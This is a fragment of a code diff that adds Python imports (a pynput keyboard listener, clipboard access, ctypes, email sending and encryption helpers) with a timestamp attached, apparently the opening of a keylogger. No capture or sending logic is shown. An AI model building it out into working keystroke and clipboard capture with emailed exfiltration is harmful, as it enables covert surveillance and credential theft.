@@ -1,0 +1,10 @@
+import os
+import threading
+import time
+from datetime import datetime 
+from pynput import keyboard
+import pyperclip
+from threading import Thread
+import ctypes
+from emailFunctionality import sendEmail
+from encryption import encryptContents      16:56:58 02-11-2024
